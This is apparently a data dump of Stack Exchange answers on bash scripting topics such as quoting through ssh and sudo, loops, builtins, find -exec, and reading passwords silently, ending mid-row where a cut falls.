<p>You can try these out with the <a href=""https://www.gnu.org/software/bash/manual/bashref.html#index-type"" rel=""nofollow noreferrer""><code>type</code> builtin</a>:</p>

<pre><code>$ type cd
cd is a shell builtin
$ type CD
CD is /usr/bin/CD
</code></pre>

<p><code>type</code> tells you what the shell will do when you run that command. When you run <code>cd</code> you access the builtin, but <code>CD</code> finds the executable. For other builtins, the builtin and the executable will be reasonably compatible (try <code>echo</code>), but for <code>cd</code> that isn't possible.</p>
"
"Bash script to convert all *flac to *.mp3 with FFmpeg?","114908","<bash><shell-script><ffmpeg>","33","<p>Try this: </p>

<pre><code>for i in *.flac ; do 
    ffmpeg -i ""$i"" -acodec libmp3lame ""$(basename ""${i/.flac}"")"".mp3
    sleep 60
done
</code></pre>
"
"Bash multiplication and addition","299321","<bash><scripting><command-substitution>","33","<p>Using arithmetic expansion:</p>

<pre><code>for (( k = 0; k &lt; 50; ++k )); do
  a=$(( 2*k + 1 ))
  echo ""$a""
done
</code></pre>

<p>Using the antiquated <code>expr</code> utility:</p>

<pre><code>for (( k = 0; k &lt; 50; ++k )); do
  a=$( expr 2 '*' ""$k"" + 1 )
  echo ""$a""
done
</code></pre>

<p>Using <code>bc -l</code> (<code>-l</code> not actually needed in this case as no math functions are used):</p>

<pre><code>for (( k = 0; k &lt; 50; ++k )); do
  a=$( bc -l &lt;&lt;&lt;""2*$k + 1"" )
  echo ""$a""
done
</code></pre>

<p>Using <code>bc -l</code> as a co-process (it acts like a sort of computation service in the background¹):</p>

<pre><code>coproc bc -l

for (( k = 0; k &lt; 50; ++k )); do
  printf ""2*%d + 1\n"" ""$k"" &gt;&amp;${COPROC[1]}
  read -u ""${COPROC[0]}"" a
  echo ""$a""
done

kill ""$COPROC_PID""
</code></pre>

<p>That last one looks (arguably) cleaner in <code>ksh93</code>:</p>

<pre><code>bc -l |&amp;
bc_pid=""$!""

for (( k = 0; k &lt; 50; ++k )); do
  print -p ""2*$k + 1""
  read -p a
  print ""$a""
done

kill ""$bc_pid""
</code></pre>

<hr>

<p>¹ This solved a an issue for me once where I needed to process a large amount of input in a loop. The processing required some floating point computations, but spawning <code>bc</code> a few times in the loop proved to be exceedingly slow. Yes, I could have solved it in many other ways, but I was bored...</p>
"
"Quoting in ssh $host $FOO and ssh $host ""sudo su user -c $FOO"" type constructs","4770","<bash><shell><ssh><quoting>","33","<p>Dealing with multiple levels of quoting (really, multiple levels of parsing/interpretation) can get complicated. It helps to keep a few things in mind: </p>

<ul>
<li>Each “level of quoting” can potentially involve a different language.</li>
<li>Quoting rules vary by language.</li>
<li>When dealing with more than one or two nested levels, it is usually easiest to work “from the bottom, up” (i.e. innermost to outermost).</li>
</ul>

<h1>Levels of Quoting</h1>

<p>Let us look at your example commands.</p>

<pre><code>pgrep -fl java | grep -i datanode | awk '{print $1}'
</code></pre>

<p>Your first example command (above) uses four languages: your shell, the regex in <em>pgrep</em>, the regex in <em>grep</em> (which might be different from the regex language in <em>pgrep</em>), and <em>awk</em>. There are two levels of interpretation involved: the shell and one level after the shell for each of the involved commands. There is only one explicit level of quoting (shell quoting into <em>awk</em>).</p>

<pre><code>ssh host …
</code></pre>

<p>Next you added a level of <em>ssh</em> on top. This is effectively another shell level: <em>ssh</em> does not interpret the command itself, it hands it to a shell on the remote end (via (e.g.) <code>sh -c …</code>) and that shell interprets the string.</p>

<pre><code>ssh host ""sudo su user -c …""
</code></pre>

<p>Then you asked about adding another shell level in the middle by using <em>su</em> (via <em>sudo</em>, which does not interpret its command arguments, so we can ignore it). At this point, you have three levels of nesting going on (<em>awk</em> → shell, shell → shell (<em>ssh</em>), shell → shell (<em>su user -c</em>), so I advise using the “bottom, up” approach. I will assume that your shells are Bourne compatible (e.g. <em>sh</em>, <em>ash</em>, <em>dash</em>, <em>ksh</em>, <em>bash</em>, <em>zsh</em>, etc.). Some other kind of shell (<em>fish</em>, <em>rc</em>, etc.) might require different syntax, but the method still applies.</p>

<h1>Bottom, Up</h1>

<ol>
<li>Formulate the string you want to represent at the innermost level.</li>
<li>Select a quoting mechanism from the quoting repertoire of the next-highest language.</li>
<li>Quote the desired string according to your selected quoting mechanism.
<ul>
<li>There are often many variations how to apply which quoting mechanism. Doing it by hand is usually a matter of practice and experience. When doing it programatically, it is usually best to pick the easiest to get right (usually the “most literal” (fewest escapes)).</li>
</ul></li>
<li>Optionally, use the resulting quoted string with additional code.</li>
<li>If you have not yet reached your desired level of quoting/interpretation, take the resulting quoted string (plus any added code) and use it as the starting string in step 2.</li>
</ol>

<h1>Quoting Semantics Vary</h1>

<p>The thing to keep in mind here is that each language (quoting level) may give slightly different semantics (or even drastically different semantics) to the same quoting character.</p>

<p>Most languages have a “literal” quoting mechanism, but they vary in exactly how literal they are. The single quote of Bourne-like shells is actually literal (which means you can not use it to quote a single quote character itself). Other languages (Perl, Ruby) are less literal in that they interpret <strong>some</strong> backslash sequences inside single quoted regions non-literally (specifically, <code>\\</code> and <code>\'</code> result in <code>\</code> and <code>'</code>, but other backslash sequences are actually literal).</p>

<p>You will have to read the documentation for each of your languages to understand its quoting rules and the overall syntax.</p>

<h1>Your Example</h1>

<p>The innermost level of your example is an <em>awk</em> program.</p>

<pre><code>{print $1}
</code></pre>

<p>You are going to embed this in a shell command line:</p>

<pre><code>pgrep -fl java | grep -i datanode | awk …
</code></pre>

<p>We need to protect (at a minimum) the space and the <code>$</code> in the <em>awk</em> program. The obvious choice is to use single quote in the shell around the whole program.</p>

<ul>
<li><code>'{print $1}'</code></li>
</ul>

<p>There are other choices though:</p>

<ul>
<li><code>{print\ \$1}</code> directly escape the space and <code>$</code></li>
<li><code>{print' $'1}</code> single quote only the space and <code>$</code></li>
<li><code>""{print \$1}""</code> double quote the whole and escape the <code>$</code></li>
<li><code>{print"" $""1}</code> double quote only the space and <code>$</code><br>
This may be bending the rules a bit (unescaped <code>$</code> at the end of a double quoted string is literal), but it seems to work in most shells.</li>
</ul>

<p>If the program used a comma between the open and close curly braces we would also need to quote or escape either the comma or the curly braces to avoid “brace expansion” in some shells.</p>

<p>We pick <code>'{print $1}'</code> and embed it in the rest of the shell “code”:</p>

<pre><code>pgrep -fl java | grep -i datanode | awk '{print $1}'
</code></pre>

<p>Next, you wanted to run this via <em>su</em> and <em>sudo</em>.</p>

<pre><code>sudo su user -c …
</code></pre>

<p><code>su user -c …</code> is just like <code>some-shell -c …</code> (except running under some other UID), so <em>su</em> just adds another shell level. <em>sudo</em> does not interpret its arguments, so it does not add any quoting levels.</p>

<p>We need another shell level for our command string. We can pick single quoting again, but we have to give special handling to the existing single quotes. The usual way looks like this:</p>

<pre><code>'pgrep -fl java | grep -i datanode | awk '\''{print $1}'\'
</code></pre>

<p>There are four strings here that the shell will interpret and concatenate: the first single quoted string (<code>pgrep … awk</code>), an escaped single quote, the single-quoted <em>awk</em> program, another escaped single quote. </p>

<p>There are, of course many alternatives:</p>

<ul>
<li><code>pgrep\ -fl\ java\ \|\ grep\ -i\ datanode\ \|\ awk\ \'{print\ \$1}</code> escape everything important</li>
<li><code>pgrep\ -fl\ java\|grep\ -i\ datanode\|awk\ \'{print\$1}</code> the same, but without superfluous whitespace (even in the <em>awk</em> program!)</li>
<li><code>""pgrep -fl java | grep -i datanode | awk '{print \$1}'""</code> double quote the whole thing, escape the <code>$</code></li>
<li><code>'pgrep -fl java | grep -i datanode | awk '""'""'{print \$1}'""'""</code> your variation; a bit longer than the usual way due to using double quotes (two characters) instead of escapes (one character)</li>
</ul>

<p>Using different quoting in the first level allows for other variations at this level:</p>

<ul>
<li><code>'pgrep -fl java | grep -i datanode | awk ""{print \$1}""'</code></li>
<li><code>'pgrep -fl java | grep -i datanode | awk {print\ \$1}'</code></li>
</ul>

<p>Embedding the first variation in the <em>sudo</em>/*su* command line give this:</p>

<pre><code>sudo su user -c 'pgrep -fl java | grep -i datanode | awk '\''{print $1}'\'
</code></pre>

<p>You could use the same string in any other single shell level contexts (e.g. <code>ssh host …</code>).</p>

<p>Next, you added a level of <em>ssh</em> on top. This is effectively another shell level: <em>ssh</em> does not interpret the command itself, but it hands it to a shell on the remote end (via (e.g.) <code>sh -c …</code>) and that shell interprets the string.</p>

<pre><code>ssh host …
</code></pre>

<p>The process is the same: take the string, pick a quoting method, use it, embed it.</p>

<p>Using single quotes again:</p>

<pre><code>'sudo su user -c '\''pgrep -fl java | grep -i datanode | awk '\'\\\'\''{print $1}'\'\\\'
</code></pre>

<p>Now there are eleven strings that are interpreted and concatenated: <code>'sudo su user -c '</code>, escaped single quote, <code>'pgrep … awk '</code>, escaped single quote, escaped backslash, two escaped single quotes, the single quoted <em>awk</em> program, an escaped single quote, an escaped backslash, and a final escaped single quote.</p>

<p>The final form looks like this:</p>

<pre><code>ssh host 'sudo su user -c '\''pgrep -fl java | grep -i datanode | awk '\'\\\'\''{print $1}'\'\\\'
</code></pre>

<p>This is a bit unwieldy to type by hand, but the literal nature of the shell’s single quoting makes it easy to automate a slight variation:</p>

<pre><code>#!/bin/sh

sq() { # single quote for Bourne shell evaluation
    # Change ' to '\'' and wrap in single quotes.
    # If original starts/ends with a single quote, creates useless
    # (but harmless) '' at beginning/end of result.
    printf '%s\n' ""$*"" | sed -e ""s/'/'\\\\''/g"" -e 1s/^/\'/ -e \$s/\$/\'/
}

# Some shells (ksh, bash, zsh) can do something similar with %q, but
# the result may not be compatible with other shells (ksh uses $'...',
# but dash does not recognize it).
#
# sq() { printf %q ""$*""; }

ap='{print $1}'
s1=""pgrep -fl java | grep -i datanode | awk $(sq ""$ap"")""
s2=""sudo su user -c $(sq ""$s1"")""

ssh host ""$(sq ""$s2"")""
</code></pre>
"
"Why shouldn't someone use passwords in the command line?","78734","<bash><command-line><security><password><command-history>","33","<p>Command lines are not just available in history. They are also available, for example, in the output of <code>ps -ocmd</code> or through the <code>/proc</code> filesystem. (<code>/proc/&lt;pid&gt;/cmdline</code>) which is where <code>ps</code> reads them.</p>

<p>Also, users' home directories are often world- or group- readable; you can make the history file only user-readable, but that might not survive deletion and recreation.</p>
"
"Add arguments to 'bash -c'","144514","<bash><shell><quoting><arguments>","33","<p>You're interpreting the man page wrong.  Firstly, the part about <code>--</code> signalling the end of options is irrelevant to what you're trying to do.  The <code>-c</code> overrides the rest of the command line from that point on, so that it's no longer going through bash's option handling at all, meaning that the <code>--</code> would be passed through to the command, not handled by bash as an end of options marker.</p>

<p>The second mistake is that extra arguments are assigned as positional parameters to the shell process that's launched, not passed as arguments to the command.  So, what you're trying to do could be done as one of:</p>

<pre><code>/bin/bash -c 'echo ""$0"" ""$1""' foo bar
/bin/bash -c 'echo ""$@""' bash foo bar
</code></pre>

<p>In the first case, passing echo the parameters <code>$0</code> and <code>$1</code> explicitly, and in the second case, using <code>""$@""</code> to expand as normal as ""all positional parameters except $0"".  Note that in that case we have to pass something to be used as <code>$0</code> as well; I've chosen ""bash"" since that's what <code>$0</code> would normally be, but anything else would work.</p>

<p>As for the reason it's done this way, instead of just passing any arguments you give directly to the command you list:  note that the documentation says ""command<strong>s</strong> are read from string"", plural.  In other words, this scheme allows you to do:</p>

<pre><code>/bin/bash -c 'mkdir ""$1""; cd ""$1""; touch ""$2""' bash dir file
</code></pre>

<p>But, note that a better way to meet your original goal might be to use <code>env</code> rather than <code>bash</code>:</p>

<pre><code>/usr/bin/env -- ""ls"" ""-l""
</code></pre>

<p>If you don't need any of the features that a shell is providing, there's no reason to use it - using <code>env</code> in this case will be faster, simpler, and less typing.  And you don't have to think as hard to make sure it will safely handle filenames containing shell metacharacters or whitespace.</p>
"
"In bash script, how to capture stdout line by line","117501","<bash><process><stdout>","33","<p>Just pipe the command into a <code>while</code> loop. There are a number of nuances to this, but basically (in <code>bash</code> or any POSIX shell):</p>
<pre><code>longcommand |
  while IFS= read -r line
  do
    whatever &quot;$line&quot;
  done
</code></pre>
<p>The other main gotcha with this (other than the <code>IFS</code> stuff below) is when you try to use variables from inside the loop once it has finished. This is because the loop is actually executed in a sub-shell (just another shell process) which you can't access variables from (also it finishes when the loop does, at which point the variables are completely gone. To get around this, you can do:</p>
<pre><code>longcommand | {
  while IFS= read -r line
  do
    whatever &quot;$line&quot;
    lastline=&quot;$line&quot;
  done

  # This won't work without the braces.
  echo &quot;The last line was: $lastline&quot;
}
</code></pre>
<p>Hauke's example of setting <code>lastpipe</code> in <code>bash</code> is another solution.</p>
<h3>Update</h3>
<p>To make sure you are processing the output of the command 'as it happens', you can use <code>stdbuf</code> to set the process' <code>stdout</code> to be line buffered.</p>
<pre><code>stdbuf -oL longcommand |
  while IFS= read -r line
  do
    whatever &quot;$line&quot;
  done
</code></pre>
<p>This will configure the process to write one line at a time into the pipe instead of internally buffering its output into blocks. Beware that the program can change this setting itself internally. A similar effect can be achieved with <code>unbuffer</code> (part of <code>expect</code>) or <code>script</code>.</p>
<p><code>stdbuf</code> is available on GNU and FreeBSD systems, it only affects the <strong><code>stdio</code></strong> buffering and only works for non-setuid, non-setgid applications that are dynamically linked (as it uses a LD_PRELOAD trick).</p>
"
"Changing parent directory (../) with symlinks","11044","<bash><cd-command>","33","<p>Bash (as well as ksh, zsh, and even ash) track directory changes so that <code>cd /foo/bar &amp;&amp; cd ..</code> always takes you to <code>/foo</code> even if <code>bar</code> is a symlink. Pass the <code>-P</code> option to <code>cd</code> to ignore the tracked change and follow the “physical” directory structure:</p>

<pre><code>cd -P ..
</code></pre>

<p>See <code>help cd</code> or <code>man builtins</code> for documentation about the bash builtin <code>cd</code>.
If you really dislike the directory tracking feature, you can turn it off with <code>set -P</code> in bash (<code>set -o no_chase_link</code> in zsh).</p>
"
"Bash commands inside vi","47793","<bash><shell><vim><vi>","33","<p>Yes, e.g if you want to do <code>ls</code>, try:</p>

<p><code>:!ls</code></p>

<p>To spawn a shell, use</p>

<p><code>:shell</code></p>
"
"Using variables to store terminal color codes for PS1?","140610","<bash><terminal><environment-variables><prompt>","33","<p>The solution is to get the shell to substitute the color variables when defining the prompt, but not the functions. To do this, use the double quotes as you had originally tried, but escape the commands so they aren't evaluated until the prompt is drawn.</p>

<pre><code>PS1=""\u@\h:\w${YELLOW}\$(virtual_env)${GREEN}\$(git_branch)${RESET}$ ""
</code></pre>

<p>Notice the <code>\</code> before the <code>$()</code> on each command.</p>

<p>If we echo this out, we see:</p>

<pre><code>echo ""$PS1""
\u@\h:\w\[\033[33m\]$(virtual_env)\[\033[32m\]$(git_branch)\[\033[0m\]$ 
</code></pre>

<p>As you can see, the color variables got substituted, but not the commands.</p>
"
"Is 'cat' a shell built-in or an external program?","208615","<bash><cat><echo><shell-builtin>","33","<p><code>type</code> tells you what the shell would use.  For example:</p>

<pre><code>$ type echo
echo is a shell builtin
$ type /bin/echo
/bin/echo is /bin/echo
</code></pre>

<p>That means that if, at the bash prompt, you type <code>echo</code>, you will get the built-in.  If you specify the path, as in <code>/bin/echo</code>, you will get the external command.</p>

<p><code>which</code>, by contrast is an external program that has no special knowledge of what the shell will do.  On debian-like systems, <code>which</code> is a shell script which searches the PATH for the executable.  Thus, it will give you the name of the external executable even if the shell would use a built-in.</p>

<p>If a command is only available as a built-in, <code>which</code> will return nothing:</p>

<pre><code>$ type help
help is a shell builtin
$ which help
$ 
</code></pre>

<p>Now, let;s look at <code>cat</code>:</p>

<pre><code>$ type cat
cat is hashed (/bin/cat)
$ which cat
/bin/cat
</code></pre>

<p><code>cat</code> is an external executable, not a shell builtin.</p>
"
"How can I save the last command to a file?","38072","<bash><shell><command-history>","33","<p>If you are using <code>bash</code>, you can use the <code>fc</code> command to display your history in the way you want:</p>

<pre><code>fc -ln -1
</code></pre>

<p>That will print out your last command. <code>-l</code> means list, <code>-n</code> means not to prefix lines with command numbers and <code>-1</code> says to show just the last command. If the whitespace at the start of the line (only the first line on multi-line commands) is bothersome, you can get rid of that easily enough with <code>sed</code>. Make that into a shell function, and you have a solution as requested (<code>getlast &gt;&gt; LOGBOOK</code>):</p>

<pre><code>getlast() {
    fc -ln ""$1"" ""$1"" | sed '1s/^[[:space:]]*//'
}
</code></pre>

<p>That should function as you have asked in your question.</p>

<p>I have added a slight variation by adding <code>""$1"" ""$1""</code> to the <code>fc</code> command. This will allow you to say, for example, <code>getlast mycommand</code> to print out the last command line invoking <code>mycommand</code>, so if you forgot to save before running another command, you can still easily save the last instance of a command. If you do not pass an argument to <code>getlast</code> (i.e. invoke <code>fc</code> as <code>fc -ln """" """"</code>, it prints out just the last command only).</p>

<p>[Note: Answer edited to account for @Bram's comment and the issue mentioned in @glenn jackman's answer.]</p>
"
"Where are bash line continuations after && and || documented?","253518","<bash><shell-script>","33","<p>A newline is ignored in a few contexts where there is manifestly an unterminated command. These contexts include after a control operator (<code>&amp;&amp;</code>, <code>||</code>, <code>|</code>, <code>&amp;</code>, <code>;</code>, <code>;;</code>, but not <code>!</code>).</p>

<p>I don't see this documented in the bash manual.</p>

<p>In POSIX, it's specified via the <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html#tag_18_10_02"">grammar rules</a>. Wherever the rules have <code>linebreak</code>, you can have zero or more line breaks.</p>
"
"How to make a for loop in command line?","377979","<bash><shell>","33","<p>The syntax of a <code>for</code> loop from the <code>bash</code> manual page is</p>

<pre><code>for name [ [ in [ word ... ] ] ; ] do list ; done
</code></pre>

<p>The semicolons may be replaced with carriage returns, as noted elsewhere in the <code>bash</code> manual page: ""A sequence of one or more newlines may appear in a list instead of a semicolon to delimit commands.""</p>

<p>However, the reverse is not true; you cannot arbitrarily replace newlines with semicolons.  Your multiline script can be converted to a single line as long as you observe the above syntax rules and do not insert an extra semicolon after the <code>do</code>:</p>

<pre><code>for i in `seq 1 10`; do echo $i; done
</code></pre>
"
"Drawing a histogram from a bash command output","177777","<bash>","33","<p>Try this in <a href=""/questions/tagged/perl"" class=""post-tag"" title=""show questions tagged &#39;perl&#39;"" rel=""tag"">perl</a> :</p>

<pre><code>perl -lane 'print $F[0], ""\t"", ""="" x ($F[1] / 5)' file
</code></pre>

<h3>EXPLANATIONS:</h3>

<ul>
<li><code>-a</code> is an explicit <code>split()</code> in <code>@F</code> array, we get the values with <code>$F[n]</code></li>
<li><code>x</code> is to tell perl to print a character N times</li>
<li><code>($F[1] / 5)</code> : here we get the number and divide it by 5 for a pretty print output (simple arithmetic)</li>
</ul>
"
"Running a loop precisely once per second","460836","<bash><timestamps><sleep>","33","<p>To stay a bit closer to the original code, what I do is:</p>

<pre><code>while true; do
  sleep 1 &amp;
  ...your stuff here...
  wait # for sleep
done
</code></pre>

<p>This changes the semantics a little: if your stuff took less than a second, it will simply wait for the full second to pass. However, if your stuff takes longer than a second for any reason, it won't keep spawning even more subprocesses with never any end to it.</p>

<p>So your stuff never runs in parallel, and not in the background, so variables work as expected too.</p>

<p>Note that if you do start additional background tasks as well, you'll have to change the <code>wait</code> instruction to only wait for the <code>sleep</code> process specifically.</p>

<p>If you need it to be even more accurate, you'll probably just have to sync it to the system clock and sleep ms instead of full seconds.</p>

<hr>

<p>How to sync to system clock? No idea really, stupid attempt:</p>

<p>Default:</p>

<pre><code>while sleep 1
do
    date +%N
done
</code></pre>

<p>Output: 003511461 010510925 016081282 021643477 028504349 03... (keeps growing)</p>

<p>Synced:</p>

<pre><code> while sleep 0.$((1999999999 - 1$(date +%N)))
 do
     date +%N
 done
</code></pre>

<p>Output: 002648691 001098397 002514348 001293023 001679137 00... (stays same)</p>
"
"sudo: unable to execute ./script.sh: no such file or directory","144718","<bash><shell-script><executable>","33","<p>This usually happens when the shebang (<code>#!</code>) line in your script is broken.</p>

<p>The shebang is what tells the kernel the file needs to be executed using an interpreter. When run without <code>sudo</code>, the message is a little more meaningful. But with <code>sudo</code> you get the message you got.</p>

<p>For example:</p>

<pre><code>$ cat test.sh
#!/bin/foo
echo bar

$ ./test.sh
bash: ./test.sh: /bin/foo: bad interpreter: No such file or directory

$ bash test.sh
bar

$ sudo ./test.sh
sudo: unable to execute ./test.sh: No such file or directory

$ sudo bash ./test.sh
bar
</code></pre>

<p>The <code>bad interpreter</code> message clearly indicates that it's the shebang which is faulty.</p>
"
"Reading passwords without showing on screen in Bash Scripts","35088","<bash><password>","33","<p>From <code>help read</code>:</p>

<blockquote>
<pre><code>-s        do not echo input coming from a terminal
</code></pre>
</blockquote>
"
"How can I use two bash commands in -exec of find command?","18077","<bash><find>","33","<p>As for the <code>find</code> command, you can also just add more <code>-exec</code> commands in a row:</p>
<pre><code>find . -name &quot;*&quot; -exec chgrp -v new_group '{}' \; -exec chmod -v 770 '{}' \;
</code></pre>
<p>Note that this command is, in its result, equivalent of using</p>
<blockquote>
<p>chgrp -v new_group file <strong>&amp;&amp;</strong> chmod -v 770 file</p>
</blockquote>
<p>on each file.</p>
<p>All the <code>find</code>'s parameters such as <code>-name</code>, <code>-exec</code>, <code>-size</code> and so on, are actually <strong>tests</strong>: <code>find</code> will continue to run them one by one as long as the entire chain so far has evaluated to <em>true</em>. So each consecutive <code>-exec</code> command is executed <strong>only if</strong> the previous ones returned <em>true</em> (i.e. <code>0</code> exit status of the commands). But <code>find</code> also understands logic operators such as <em>or</em> (<code>-o</code>) and <em>not</em> (<code>!</code>). Therefore, to use a chain of <code>-exec</code> tests <strong>regardless</strong> of the previous results, one would need to use something like this:</p>
<pre><code>find . -name &quot;*&quot; \( -exec chgrp -v new_group {} \; -o -true \) -exec chmod -v 770 {} \; 
</code></pre>
"
"Verify the length of a variable","145150","<bash><shell><string>","33","<p>More elegant? No</p>

<p>Shorter? Yes :)</p>

<pre><code>#!/bin/bash
read string
if [ ${#string} -ge 5 ]; then echo ""error"" ; exit
else echo ""done""
fi
</code></pre>

<p>And if you have no problem on trading more elegance in favor of being shorter, you can have a script with 2 lines less:</p>

<pre><code>#!/bin/bash
read string
[ ${#string} -ge 5 ] &amp;&amp; echo ""error"" || echo ""done""
</code></pre>

<p>You could use double brackets if you think it is safer. <a href=""https://stackoverflow.com/q/669452/2231796"">Explanation here</a>.</p>
"
"print output to 3 separate columns","59249","<bash><filenames><columns><printf>","33","<p>You can use the shell command 'column' for that, check: <a href=""http://linux.die.net/man/1/column""><code>column</code> MAN page</a>.</p>

<p>Combine this with a loop and you're in business, e.g.:</p>

<pre><code>#!/bin/sh

MYPATH=/
TOTALFILE=$(ls $MYPATH/* | wc -l)
FILE=$(ls -1tcr $MYPATH/* | head -5 | rev | cut -d/ -f1 | rev)

declare -a FILES
declare -a FILETIME

OUTPUT=""FILENAME CREATED TIME ERROR_HEADER\n\n------------------------------ ----------------------------- ----------------------------------- ------$

for i in $MYPATH/*;
do
    FILES[${#FILES[@]}]=""$i""
    FILETIME[${#FILETIME[@]}]=$(stat --format=%y $i | head -5 | cut -d'.' -f1)
    TOPLINE=$(head -1 $i | grep -Po '"".*?""' | head -5)

    OUTPUT=""$OUTPUT\n${FILES[${#FILES[@]}-1]} ${FILETIME[${#FILETIME[@]}-1]} $TOPLINE\n""
done

echo -ne $OUTPUT | column -t
</code></pre>
"
"In Bash, are if [ -z ""$1"" ] and if [ ""$1"" = """" ] the same?","3831","<bash><shell-script>","32","<p><code>[ ""$1"" = """" ]</code> and <code>[ -z ""$1"" ]</code> are exactly equivalent in bash and other POSIX-compliant shells. (Note that there must be a space on each side of the brackets, unless there is a non-word-constituent character like <code>;</code>.)</p>

<p><code>[</code> is a shell built-in like any other; in fact it can also be spelled <code>test</code> (the only difference between the two is that <code>[</code> requires a <code>]</code> as the last argument). So if you run <code>[ ""$1"" = """" ]</code> with <code>$1</code> expanding to <code>-z</code>, the test operator sees three arguments: <code>-z</code>, <code>=</code> and the empty string. Some older <a href=""http://en.wikipedia.org/wiki/Bourne_shell"">Bourne</a> shells sometimes threw parse errors when an operand looked like an operator in this way, even if there was no ambiguity in the complete expression. I don't know if any version did in fact have trouble with this particular expression, but more complex expressions could throw them off. There may also have been versions that had trouble with empty words; these would not have supported <code>[ -z ""$1"" ]</code> either. A common shell idiom is <code>[ x""$1"" = x"""" ]</code>. It avoids any risk of having operands parsed as operators because no operator starts with a letter.</p>

<p>In ksh, bash and zsh, you can use the double bracket syntax, <code>[[ -z $1 ]]</code>. This newer syntax (it's from the late 1980s rather than the mid-1970s) eliminates the risk of having operands parsed as operators by using a special syntactic construct rather than an ordinary built-in. Operators must appear literally, unquoted within the double brackets, and you don't need to double quote variable expansions.</p>
"
"Check if $REPLY is in a range of numbers","118856","<bash><shell-script><arithmetic>","32","<p>The <code>[</code> command/shell builtin has comparison tests, so you can just do</p>

<pre><code>if [ ""$REPLY"" -ge 1 ] &amp;&amp; [ ""$REPLY"" -le 32 ]; then REPLY=-2;
elif [ ""$REPLY"" -ge 33 ] &amp;&amp; [ ""$REPLY"" -le 48 ]; then REPLY=-1; fi
</code></pre>

<p>where <code>-ge</code> means greater-or-equal-to (and so on). The <code>[</code> command is just a command, not special syntax (it's actually the same as <code>test</code>: check out <code>man test</code>), so it NEEDS the space after it. If you write <code>[$REPLY</code> it will try to find a command named <code>[$REPLY</code> and execute it, which won't work. The same goes for closing <code>]</code>.</p>

<p>Here, we're using the <code>&amp;&amp;</code> shell operator to run the second command only if the first is successful. <code>[</code> also supports <code>-a</code> to <em>and</em> two tests, but it's deprecated and its usage should be discouraged as it causes arguments not to be parseable reliably.</p>

<p>Edit: to test if the number is integer (if that can happen in your code), first do the test</p>

<pre><code>if [[ ""$REPLY"" =~ ^[0-9]+$ ]]; then
   existing code
else echo ""$REPLY is not an integer"" &gt;&amp;2 &amp;&amp; exit 1; fi
</code></pre>

<p>Of course all these bracket expressions return 0 (true) or 1 (false) and can be combined. Not only you can put everything in the same bracket, you can also do</p>

<pre><code>if [[ ""$REPLY"" =~ ^[0-9]+$ ]] &amp;&amp; [ ""$REPLY"" -ge 1 ] &amp;&amp; [ ""$REPLY"" -le 32 ]; then ...
</code></pre>

<p>or something similar.</p>
"
"What is the difference if I start bash with ""/bin/bash"" or ""/usr/bin/env bash""?","206350","<bash><environment-variables>","32","<p>In one sense, using <code>env</code> could be considered ""portable"" in that the path to <code>bash</code> is not relevant (<code>/bin/bash</code>, <code>/usr/bin/bash</code>, <code>/usr/local/bin/bash</code>, <code>~/bin/bash</code>, or whatever path) because it is specified in the environment. In this way, a script author could make his script easier to run on many different systems.</p>

<p>In another sense, using <code>env</code> to find <code>bash</code> or any other shell or command  interpreter is considered a security risk because an unknown binary (malware) might be used to execute the script. In these environments, and sometimes by managerial policy, the path is specified explicitly with a full path: <code>#!/bin/bash</code>.</p>

<p>In general, use <code>env</code> unless you know you are writing in one of these environments that scrutinize the minute details of risk.</p>

<p>When Ubuntu first started using <code>dash</code>, some time in 2011, many scripts were broken by that action. There was discussion about it on askubuntu.com. Most scripts were written <code>#!/bin/sh</code> which was a link to <code>/bin/bash</code>. The consensus was this: the script writer is responsible for specifying the interpreter. Therefore, if your script should always be invoked with BASH, specify it from the environment. This saves you having to guess the path, which is different on various Unix/Linux systems. In addition, it will work if tomorrow <code>/bin/sh</code> becomes a link to some other shell like <code>/bin/newsh</code>.</p>

<p>Another difference is that the <code>env</code> method won't allow the passing of arguments to the interpreter.</p>
"
"How can a bash script detect if it is running in the background?","118462","<bash><shell>","32","<p>Quoting <a href=""http://unixhelp.ed.ac.uk/CGI/man-cgi?ps"" rel=""noreferrer""><code>man ps</code></a>:</p>
<h2>PROCESS STATE CODES</h2>
<pre><code>   Here are the different values that the s, stat and state output
   specifiers (header &quot;STAT&quot; or &quot;S&quot;) will display to describe the state of
   a process.
   ...
   +    is in the foreground process group
</code></pre>
<p>So you could perform a simple check:</p>
<pre><code>case $(ps -o stat= -p $$) in
  *+*) echo &quot;Running in foreground&quot; ;;
  *) echo &quot;Running in background&quot; ;;
esac
</code></pre>
"
"How do I force a user to change a password at the first time login using ssh?","173708","<linux><bash><ssh><login><pam>","32","<p>change the age of password to 0 day </p>

<p>syntax <code>chage -d 0 {user-name}</code></p>

<p>In this case </p>

<p><code>chage -d0 foo </code></p>

<p>This works for me over ssh also </p>
"
"If I sudo execute a Bash script file, will all commands inside the Bash script be executed as sudo as well?","115276","<bash><shell-script><shell><sudo>","32","<blockquote>
  <p><strong>Q#1:</strong> Will I only be prompted for a sudo password once, or will I need to enter the sudo password on each invocation of a command inside the script, that needs sudo permission? </p>
</blockquote>

<p>Yes, once, for the duration of the running of your script. </p>

<p><strong>NOTE:</strong> When you provide credentials to <code>sudo</code>, the authentication is typically good for 5 minutes within the shell where you typed the password. Additionally any child processes that get executed from this shell, or any script that runs in the shell (your case) will also run at the elevated level.</p>

<blockquote>
  <p><strong>Q#2:</strong> is there still a possibility that the sudo permissions will time out (if, for instance, a particular command takes long enough to exceed the sudo timeout)? Or will the initial sudo password entrance last for the complete duration of whole script?</p>
</blockquote>

<p>No they will not timeout within the script. Only if you interactively were typing them within the shell where the credentials were provided. Every time <code>sudo</code> is executed within this shell, the timeout is reset. But in your case they credentials will remain so long as the script is executing and running commands from within it.</p>

<em>excerpt from sudo man page</em>

<blockquote>
  <p>This limit is policy-specific; the default password prompt timeout for the sudoers security policy is 5 minutes.</p>
</blockquote>
"
"Glob with Numerical Order","38317","<bash><filenames><wildcards>","32","<p>Depending on your environment you can use <code>ls -v</code> with GNU coreutils, e.g.:</p>

<pre><code>gs -q -sPAPERSIZE=a4 -dNOPAUSE -dBATCH -sDEVICE=pdfwrite \
   -sOutputFile=out.pdf $(ls -v)
</code></pre>

<p>Or if you are on recent versions of FreeBSD or OpenBSD:</p>

<pre><code>gs -q -sPAPERSIZE=a4 -dNOPAUSE -dBATCH -sDEVICE=pdfwrite \
   -sOutputFile=out.pdf $(ls | sort -V)
</code></pre>
"
"How to efficiently generate large, uniformly distributed, random integers in bash?","157250","<bash><shell-script><command-line>","32","<p>Thank you all for all your great answers. I ended up with the following solution, that I would like to share.</p>

